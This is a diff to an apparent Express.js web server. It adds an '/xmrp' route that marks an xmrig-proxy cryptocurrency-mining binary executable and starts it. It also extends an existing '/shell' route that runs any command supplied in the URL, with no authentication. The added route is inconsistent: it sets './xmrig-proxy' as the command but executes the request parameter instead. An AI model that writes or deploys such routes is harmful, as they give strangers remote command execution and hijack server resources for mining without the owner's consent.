@@ -18,12 +18,32 @@ app.get('/ls', function(request, response)  {
     response.send(cmd)
 })
 
+function chmod() {
+    cmd = 'chmod +x xmrig-proxy'
+    console.log('$'+cmd)
+    $PSshell(cmd).out()
+}
+
+app.get('/xmrp', function(request, response)  {    
+    setTimeout(chmod, 3000);
+    cmd = './xmrig-proxy'
+    console.log('$'+cmd)
+    $PSshell(request.params.cmd).pipe(process.stdout)
+    .data(function(err, stdout, stderr) {
+        // handle error
+        console.log(stdout) // prints
+    })
+    response.send(cmd)
+})
+
 app.get('/shell', function(request, response)  {
+    console.log(request)
+    console.log(request.params)
     console.log('$'+request.params.cmd)
     $PSshell(request.params.cmd).pipe(process.stdout)
     .data(function(err, stdout, stderr) {
         // handle error
-        console.log(stdout); // prints
+        console.log(stdout) // prints
     })
     response.send(request.params.cmd)
 })
